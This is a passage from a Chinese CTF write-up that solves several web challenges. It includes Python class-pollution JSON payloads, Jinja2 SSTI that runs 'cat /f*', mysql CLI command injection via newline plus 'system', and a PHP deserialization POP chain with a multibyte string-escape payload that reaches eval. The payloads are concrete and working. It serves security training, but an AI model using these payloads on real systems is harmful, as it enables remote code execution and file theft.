invoke__">pollute</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.is_json:</span><br><span class="line">            <span class="title function_ invoke__">merge</span>(json.<span class="title function_ invoke__">loads</span>(request.data), instance)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;这个魔术还行吧&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;我要json的魔术&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;记得用POST方法把魔术交上来&quot;</span></span><br></pre></td></tr></table></figure>
<p>这里可以看到BLACKLIST_IN_index = [‘{‘,’}’]，这里就禁用了{}所以直接ssti就有问题，很明显想让我们通过原型链污染来将其污染掉，其实也挺简单，可能/magic就是污染的地方，将上传的地方改为json再进行上传即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;BLACKLIST_IN_index&quot;</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后就是在index中进行简单的ssti即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].<span class="title function_ invoke__">popen</span>(<span class="string">&#x27;cat /f*&#x27;</span>).<span class="title function_ invoke__">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>这里再讲一个非预期解，其实这里还是可以通过第一个原型链污染的方法污染静态代码目录来读取flag，和第一个的一样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;./&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后访问/static/flag即可</p>
<h3 id="Fin-Lucky-Number"><a href="#Fin-Lucky-Number" class="headerlink" title="[Fin] Lucky Number"></a>[Fin] Lucky Number</h3><p>这个直接给源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">你不会以为这里真的有flag吧？</span><br><span class="line">想要flag的话先提交我的幸运数字<span class="number">5346</span></span><br><span class="line">但是我的主人觉得我泄露了太多信息，就把我的幸运数字给删除了</span><br><span class="line">但是听说在heaven中有一种create方法，配合__kwdefaults__可以创造出任何事物，你可以去/m4G1c里尝试着接触到这个方法</span><br><span class="line">下面是前人留下来的信息，希望对你有用</span><br><span class="line"><span class="keyword">from</span> flask import Flask,request,render_template_string,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 import Template</span><br><span class="line">import json</span><br><span class="line">import heaven</span><br><span class="line">def <span class="title function_ invoke__">merge</span>(src, dst):</span><br><span class="line">    <span class="keyword">for</span> k, v in src.<span class="title function_ invoke__">items</span>():</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.<span class="title function_ invoke__">get</span>(k) <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(v) == dict:</span><br><span class="line">                <span class="title function_ invoke__">merge</span>(v, dst.<span class="title function_ invoke__">get</span>(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif <span class="title function_ invoke__">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(v) == dict:</span><br><span class="line">            <span class="title function_ invoke__">merge</span>(v, <span class="title function_ invoke__">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="title function_ invoke__">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls</span>():</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__init__</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        <span class="title">pass</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">instance</span> = <span class="title">cls</span>()</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">BLACKLIST_IN_index</span> = [&#x27;</span>&#123;<span class="string">&#x27;,&#x27;</span>&#125;<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">def is_json(data):</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        json.loads(data)</span></span><br><span class="line"><span class="string">        return True</span></span><br><span class="line"><span class="string">    except ValueError:</span></span><br><span class="line"><span class="string">        return False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;</span>/m4G1c<span class="string">&#x27;,methods=[&#x27;</span>POST<span class="string">&#x27;, &#x27;</span>GET<span class="string">&#x27;])</span></span><br><span class="line"><span class="string">def pollute():</span></span><br><span class="line"><span class="string">    if request.method == &#x27;</span>POST<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">        if request.is_json:</span></span><br><span class="line"><span class="string">            merge(json.loads(request.data), instance)</span></span><br><span class="line"><span class="string">            result = heaven.create()</span></span><br><span class="line"><span class="string">            message = result[&quot;message&quot;]</span></span><br><span class="line"><span class="string">            return &quot;这个魔术还行吧</span></span><br><span class="line"><span class="string">&quot; + message</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            return &quot;我要json的魔术&quot;</span></span><br><span class="line"><span class="string">    return &quot;记得用POST方法把魔术交上来&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#heaven.py</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def create(kon=&quot;Kon&quot;, pure=&quot;Pure&quot;, *, confirm=False):</span></span><br><span class="line"><span class="string">    if confirm and &quot;lucky_number&quot; not in create.__kwdefaults__:</span></span><br><span class="line"><span class="string">        return &#123;&quot;message&quot;: &quot;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？&quot;, &quot;lucky_number&quot;: &quot;nope&quot;&#125;</span></span><br><span class="line"><span class="string">    if confirm and &quot;lucky_number&quot; in create.__kwdefaults__:</span></span><br><span class="line"><span class="string">        return &#123;&quot;message&quot;: &quot;这是你的lucky_number，请拿好，去/check下检查一下吧&quot;, &quot;lucky_number&quot;: create.__kwdefaults__[&quot;lucky_number&quot;]&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    return &#123;&quot;message&quot;: &quot;你有什么想创造的吗？&quot;, &quot;lucky_number&quot;: &quot;nope&quot;&#125;</span></span><br></pre></td></tr></table></figure>
<p>也是一个原型链污染，具体污染什么可以直接通过源码看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#heaven.py</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">create</span>(kon=<span class="string">&quot;Kon&quot;</span>, pure=<span class="string">&quot;Pure&quot;</span>, *, confirm=False):</span><br><span class="line">    <span class="keyword">if</span> confirm <span class="keyword">and</span> <span class="string">&quot;lucky_number&quot;</span> not in create.__kwdefaults__:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？&quot;</span>, <span class="string">&quot;lucky_number&quot;</span>: <span class="string">&quot;nope&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> confirm <span class="keyword">and</span> <span class="string">&quot;lucky_number&quot;</span> in create.__kwdefaults__:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;这是你的lucky_number，请拿好，去/check下检查一下吧&quot;</span>, <span class="string">&quot;lucky_number&quot;</span>: create.__kwdefaults__[<span class="string">&quot;lucky_number&quot;</span>]&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;你有什么</span></span><br></pre></td></tr></table></figure>
<p>可以看到在heaven.py里面有一个函数就是create里面有两个if需要绕过</p>
<p>第一就是confirm参数为true，其次lucky<em>number在create.<em>_kwdefaults</em></em>(这个就是create函数关键字参数的默认值的字典)中，这里就是我们的幸运数字，题目直接给了</p>
<p>思路还是一样通过获取全局属性进行修改函数里面<strong>kwdefaults</strong>的值即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;heaven&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;create&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;__kwdefaults__&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;confirm&quot;</span>:<span class="string">&quot;True&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;lucky_number&quot;</span>:<span class="string">&quot;5346&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/base16.png" width="95%" height="80%"></p>
<p>最后查看/check给出一个/ssSstTti1最后通过ssti来得flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].<span class="title function_ invoke__">popen</span>(<span class="string">&#x27;cat /f*&#x27;</span>).<span class="title function_ invoke__">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>这里还是有一个非预期解直接通过静态目录污染即可，我感觉这里是出题人的疏忽吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;./&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再访问/static/flag</p>
<h3 id="Fin-RCE-or-Sql-Inject"><a href="#Fin-RCE-or-Sql-Inject" class="headerlink" title="[Fin] RCE or Sql Inject"></a>[Fin] RCE or Sql Inject</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sql&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/se|ec|;|@|del|into|outfile/i&#x27;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你知道的，不可能有sql注入&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你知道的，不可能有RCE&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$query</span>);</span><br></pre></td></tr></table></figure>
<p>这里将sql注入又进行了过滤，所以使用sql注入就不可能了</p>
<p>这里就需要通过rce来读取flag，题目是一个比较冷门的考点，mysql命令行程序的命令执行，常见于mysql有suid时的提权</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">0</span>asystem whoami <span class="comment">//这样通过换行符来执行命令</span></span><br><span class="line">%<span class="number">0</span>asystem export <span class="comment">//通过环境变量读flag</span></span><br></pre></td></tr></table></figure>
<h3 id="Fin-ez-php"><a href="#Fin-ez-php" class="headerlink" title="[Fin] ez_php"></a>[Fin] ez_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>); </span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;hacker&quot;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&quot;hacker&quot;</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end = <span class="variable language_">$this</span>-&gt;start; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfer/i&#x27;</span>,<span class="variable">$this</span>-&gt;username))&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Hacker！&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">c</span>(); </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;C&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;t-&gt;t; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;f-&gt;f); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123; </span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;e)(); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">R</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;r); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ez_ser.from_you&#x27;</span>]))&#123; </span><br><span class="line">    <span class="variable">$ctf</span> = <span class="keyword">new</span> <span class="title class_">Hacker</span>(<span class="string">&#x27;&#123;&#123;&#123;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;ez_ser.from_you&#x27;</span>].<span class="string">&#x27;&#125;&#125;&#125;&#x27;</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;substr&#x27;</span>]))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$pre</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;substr&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;substr&#x27;</span>]:<span class="string">&quot;substr&quot;</span>; </span><br><span class="line">    <span class="variable">$ser_ctf</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$pre</span>.<span class="string">&quot;[&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$ctf</span>).<span class="string">&quot;]&quot;</span>); </span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser_ctf</span>); </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;杂鱼~杂鱼~&quot;</span>); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这个题看到一个pop链，就可以先去构造,需要注意的是这里需要绕过throw new Exception(“杂鱼~杂鱼~”); ，所以，这里就需要去提前触发Hacker里面的__destruct(),这里就可以通过php回收机制来进行绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">R</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Hacker</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;end = &amp;<span class="variable">$a</span>-&gt;username;</span><br><span class="line"><span class="variable">$a</span>-&gt;start = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">T</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start-&gt;c-&gt;t = <span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start-&gt;c-&gt;t-&gt;f = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e = <span class="keyword">new</span> <span class="title function_ invoke__">R</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e-&gt;r = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&#x27;1&#x27;</span>=&gt;<span class="variable">$a</span>,<span class="string">&#x27;2&#x27;</span>=&gt;<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//a:2:&#123;i:1;O:6:&quot;Hacker&quot;:3:&#123;s:5:&quot;start&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;T&quot;:1:&#123;s:1:&quot;t&quot;;O:1:&quot;F&quot;:1:&#123;s:1:&quot;f&quot;;O:1:&quot;E&quot;:1:&#123;s:1:&quot;e&quot;;O:1:&quot;R&quot;:1:&#123;s:1:&quot;r&quot;;s:13:&quot;system(&quot;ls&quot;);&quot;;&#125;&#125;&#125;&#125;&#125;s:3:&quot;end&quot;;s:6:&quot;hacker&quot;;s:8:&quot;username&quot;;R:9;&#125;i:2;N;&#125;</span></span><br></pre></td></tr></table></figure>
<p>序列化的结果在最后有一个i:2;，改为i:1，来提前触发__destruct()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">1</span>;O:<span class="number">6</span>:<span class="string">&quot;Hacker&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;T&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;t&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;F&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;f&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;E&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;e&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;R&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;r&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;system(&quot;</span>ls<span class="string">&quot;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="number">3</span>:<span class="string">&quot;end&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;hacker&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;R:<span class="number">9</span>;&#125;i:<span class="number">1</span>;N;&#125;</span><br></pre></td></tr></table></figure>
<p>这里就已经完成第一步了，接下来就要看如何提交参数和进行逃逸</p>
<p>参数的合法可以直接将第一个改为[即可 ez[ser.from<em>you 否则后面的.会被解析为</em></p>
<p>接下来就得开始字符串逃逸的操作，首先需要知道一点,可以查看对于比赛的题目来进行类似</p>
<p><a href="https://chenxi9981.github.io/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/#Web">https://chenxi9981.github.io/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/#Web</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">每发送一个%f0abc，mb_strpos认为是<span class="number">4</span>个字节，mb_substr认为是<span class="number">1</span>个字节，相差<span class="number">3</span>个字节</span><br><span class="line">每发送一个%f0%<span class="number">9</span>fab,mb_strpos认为是<span class="number">3</span>个字节，mb_substr认为是<span class="number">1</span>个字节，相差<span class="number">2</span>个字节</span><br><span class="line">每发送一个%f0%<span class="number">9</span>f%<span class="number">9</span>fa,mb_strpos认为是<span class="number">2</span>个字节，mb_substr认为是<span class="number">1</span>个字节，相差<span class="number">1</span>个字节</span><br></pre></td></tr></table></figure>
<p>这里如果直接将我们构造好的链子上传就变为了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Hacker&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;s:<span class="number">214</span>:<span class="string">&quot;&#123;&#123;&#123;a:2:&#123;i:1;O:6:&quot;</span>Hacker<span class="string">&quot;:3:&#123;s:5:&quot;</span>start<span class="string">&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;O:1:&quot;</span>T<span class="string">&quot;:1:&#123;s:1:&quot;</span>t<span class="string">&quot;;O:1:&quot;</span>F<span class="string">&quot;:1:&#123;s:1:&quot;</span>f<span class="string">&quot;;O:1:&quot;</span>E<span class="string">&quot;:1:&#123;s:1:&quot;</span>e<span class="string">&quot;;O:1:&quot;</span>R<span class="string">&quot;:1:&#123;s:1:&quot;</span>r<span class="string">&quot;;s:13:&quot;</span><span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;s:3:&quot;</span>end<span class="string">&quot;;s:6:&quot;</span>hacker<span class="string">&quot;;s:8:&quot;</span>username<span class="string">&quot;;R:9;&#125;i:2;N;&#125;&#125;&#125;&#125;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;end&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;hacker&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>前面的其中的38个字符是没有用的，后面的可以不用管，会在序列化时被忽视，所以只需要将前面的去除即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Hacker&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;s:<span class="number">214</span>:<span class="string">&quot;&#123;&#123;&#123;</span></span><br></pre></td></tr></table></figure>
<p>最后面的payload就出来了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%<span class="number">9</span>fab&amp;ez[ser.from_you=a:<span class="number">2</span>:&#123;i:<span class="number">1</span>;O:<span class="number">6</span>:<span class="string">&quot;Hacker&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;T&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;t&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;F&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;f&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;E&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;e&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;R&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;r&quot;</span>;s:<span 